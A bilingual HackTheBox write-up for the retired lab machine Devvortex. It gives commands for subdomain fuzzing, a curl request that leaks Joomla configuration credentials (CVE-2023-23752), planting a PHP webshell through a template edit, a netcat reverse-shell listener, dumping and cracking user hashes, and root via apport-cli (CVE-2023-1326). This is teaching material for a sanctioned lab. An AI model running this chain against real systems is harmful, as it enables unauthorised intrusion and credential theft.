# Devvortex [Easy]

> **ES:** Máquina Linux fácil: un Joomla con divulgación de información filtra credenciales, y un `sudo` sobre apport-cli permite ser root.
> **EN:** Easy Linux machine: a Joomla with information disclosure leaks credentials, and a `sudo` on apport-cli allows root.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/Devvortex] |
| **URL** | https://app.hackthebox.com/machines/Devvortex |
| **IP lab** | 10.10.11.242 |
| **Fecha de resolución** | 2024-03-01 |

---

## Fuentes / Sources

- [IppSec: Devvortex (video)](https://youtube.com/watch?v=jdWOXokQQK0) - IppSec - fecha de acceso: 2026-09-24.

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía Joomla CVE-2023-23752 → plantilla PHP con shell → hash crackeado (logan) → apport-cli (CVE-2023-1326).
> **EN:** Get `user.txt` and `root.txt` via Joomla CVE-2023-23752 → PHP template shell → cracked hash (logan) → apport-cli (CVE-2023-1326).

---

## Fuentes / Sources


## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] gobuster / ffuf (vhosts y directorios)
- [ ] curl (endpoint de configuración Joomla `?public=true`)
- [ ] john / hashcat
- [ ] ssh

---

## Fuentes / Sources


## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** SSH y nginx que redirige a `devvortex.htb`. Hay que fijar el vhost en `/etc/hosts`.
> **EN:** SSH and nginx redirecting to `devvortex.htb`. Pin the vhost in `/etc/hosts`.

```bash
nmap -sC -sV -oN nmap_init 10.10.11.242
echo "10.10.11.242 devvortex.htb dev.devvortex.htb" | sudo tee -a /etc/hosts
```

**Resultado / Result:** 22/tcp OpenSSH 8.2p1, 80/tcp nginx 1.18.0. Capturas del sitio en `img/`.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** Fuzzing de subdominios revela `dev.devvortex.htb`, que corre Joomla (visible en `/administrator/` y ficheros típicos como `configuration.php`, `htaccess.txt`).
> **EN:** Subdomain fuzzing reveals `dev.devvortex.htb`, running Joomla (visible at `/administrator/` and typical files like `configuration.php`, `htaccess.txt`).

```bash
ffuf -u http://10.10.11.242 -H "Host: FUZZ.devvortex.htb" -w subdomains.txt
gobuster dir -u http://dev.devvortex.htb/ -w directory-list-2.3-medium.txt
curl -s http://dev.devvortex.htb/administrator/ | head
```

**Resultado / Result:** Subdominio `dev.devvortex.htb` con Joomla 4.2.x, vulnerable a divulgación (CVE-2023-23752).

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** El endpoint de la API con `?public=true` filtra `configuration.php` (usuario/contraseña). Con esas credenciales se entra al `/administrator` y se edita una plantilla para inyectar PHP.
> **EN:** The API endpoint with `?public=true` leaks `configuration.php` (user/password). With those credentials log into `/administrator` and edit a template to inject PHP.

```bash
curl -s "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true"
# login en http://dev.devvortex.htb/administrator/ -> Templates -> editar index.php con webshell
curl -s http://dev.devvortex.htb/templates/<plantilla>/shell.php
nc -lvnp 9999
```

**Resultado / Result:** Ejecución PHP como `www-data` → reverse shell. (Nota local `index.md` quedó en TODO; flujo completado según `devvortex.md`.)

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** Con acceso a MySQL (credenciales del config) se leen hashes de la tabla de usuarios; el de `logan` se crackea y se reutiliza en SSH.
> **EN:** With MySQL access (config credentials) read hashes from the users table; `logan`'s cracks and is reused over SSH.

```bash
mysql -u <user-config> -p -h 127.0.0.1 -e "SELECT * FROM <prefijo>_users;"
ssh logan@10.10.11.242
cat /home/logan/user.txt
```

**Resultado / Result:** SSH como `logan` (password reuse) → `user.txt` (flag no reproducida).

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `sudo -l` permite `apport-cli` como root; su versión es vulnerable (CVE-2023-1326) y da shell de root.
> **EN:** `sudo -l` allows `apport-cli` as root; its version is vulnerable (CVE-2023-1326) and yields a root shell.

```bash
sudo -l
apport-cli --version
sudo /usr/bin/apport-cli --help
# explotar CVE-2023-1326 segun PoC publico
whoami
cat /root/root.txt
```

**Resultado / Result:** Shell como `root` vía apport-cli. Técnica: privesc por binario `sudo` vulnerable (CVE-2023-1326).

---

## Fuentes / Sources


## 🧠 Lo aprendido / Learned

> **ES:** Enumerar vhosts/subdominios abre la superficie real; los CVE de divulgación en CMS regalan el config; el acceso admin al CMS equivale a RCE (plantillas); `sudo -l` + versión del binario decide el privesc.
> **EN:** Enumerating vhosts/subdomains opens the real surface; CMS disclosure CVEs give away the config; CMS admin access equals RCE (templates); `sudo -l` + binary version decides privesc.

- [ ] Fuzzing de subdominios y vhosts
- [ ] Joomla CVE-2023-23752 (info disclosure → config)
- [ ] RCE vía plantilla Joomla + crack de hash + reuse
- [ ] Privesc apport-cli CVE-2023-1326

---

## Fuentes / Sources


## 📚 Fuentes y Referencias / Sources

- **Fuente:** Notas locales `Soluciones/Machines/unclasified/Devvortex/index.md` (parcial, TODO) y `Soluciones/Machines/unclasified/Devvortex/devvortex.md` (flujo completo de tareas) — autor original de las notas locales
- **Walkthrough de referencia:** Máquina Devvortex en HackTheBox — https://app.hackthebox.com/machines/Devvortex
- **Referencia técnica:** CVE-2023-23752 (Joomla) — https://nvd.nist.gov/vuln/detail/CVE-2023-23752
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
- **Nota de migración:** Contenido migrado y normalizado desde `index.md`/`devvortex.md` al molde `_PLANIFICACION/PLANTILLA_MACHINE.md`; paráfrasis propia, sin flags completas.

---

## Fuentes / Sources


## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
